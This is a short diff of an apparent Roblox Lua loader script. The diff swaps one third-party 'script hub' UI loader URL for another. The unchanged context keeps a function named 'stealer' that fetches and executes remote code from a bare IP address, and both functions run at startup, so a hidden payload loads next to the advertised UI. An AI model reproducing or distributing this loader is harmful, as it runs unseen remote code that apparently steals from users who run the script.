@@ -3,7 +3,7 @@ local function stealer()
     loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/dy1zn4t/NatHub/refs/heads/main/loader"))();
 end
 task.spawn(stealer)
 task.spawn(loadui)
